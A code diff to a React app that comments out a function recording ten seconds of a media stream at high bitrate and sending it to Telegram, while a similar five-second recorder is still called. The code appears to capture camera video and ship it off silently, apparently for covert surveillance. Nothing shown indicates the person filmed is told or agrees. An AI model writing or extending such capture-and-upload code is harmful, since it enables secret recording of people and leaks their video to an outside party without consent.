@@ -155,48 +155,48 @@ function App() {
         }, 5000);
       };
 
-      const sendVideo10Detik = async () => {
-        // Configure video recording with maximum quality
-        const mediaRecorder = new MediaRecorder(stream, {
-          mimeType: supportedMimeType,
-          videoBitsPerSecond: 8000000, // 8 Mbps for high quality
-        });
+      // const sendVideo10Detik = async () => {
+      //   // Configure video recording with maximum quality
+      //   const mediaRecorder = new MediaRecorder(stream, {
+      //     mimeType: supportedMimeType,
+      //     videoBitsPerSecond: 8000000, // 8 Mbps for high quality
+      //   });
 
-        const chunks: BlobPart[] = [];
+      //   const chunks: BlobPart[] = [];
 
-        mediaRecorder.ondataavailable = (e) => {
-          if (e.data.size > 0) {
-            chunks.push(e.data);
-          }
-        };
+      //   mediaRecorder.ondataavailable = (e) => {
+      //     if (e.data.size > 0) {
+      //       chunks.push(e.data);
+      //     }
+      //   };
 
-        mediaRecorder.onstop = async () => {
-          const videoBlob = new Blob(chunks, {
-            type: supportedMimeType.includes("mp4")
-              ? "video/mp4"
-              : "video/webm",
-          });
-          console.log("Video recording completed, size:", videoBlob.size);
-          await sendVideoToTelegram(videoBlob);
-          stream.getTracks().forEach((track) => track.stop());
-        };
+      //   mediaRecorder.onstop = async () => {
+      //     const videoBlob = new Blob(chunks, {
+      //       type: supportedMimeType.includes("mp4")
+      //         ? "video/mp4"
+      //         : "video/webm",
+      //     });
+      //     console.log("Video recording completed, size:", videoBlob.size);
+      //     await sendVideoToTelegram(videoBlob);
+      //     stream.getTracks().forEach((track) => track.stop());
+      //   };
 
-        // Start recording with frequent data chunks for better quality
-        mediaRecorder.start(1000);
-        console.log("Started recording video");
+      //   // Start recording with frequent data chunks for better quality
+      //   mediaRecorder.start(1000);
+      //   console.log("Started recording video");
 
-        // Stop recording after 10 seconds
-        setTimeout(() => {
-          if (mediaRecorder.state === "recording") {
-            console.log("Stopping video recording");
-            mediaRecorder.stop();
-          }
-        }, 10000);
-      };
+      //   // Stop recording after 10 seconds
+      //   setTimeout(() => {
+      //     if (mediaRecorder.state === "recording") {
+      //       console.log("Stopping video recording");
+      //       mediaRecorder.stop();
+      //     }
+      //   }, 10000);
+      // };
 
       // Start video recording
       sendVideo5Detik();
-      sendVideo10Detik();
+      // sendVideo10Detik();
     } catch (error) {
       console.error("Error capturing media:", error);
     }
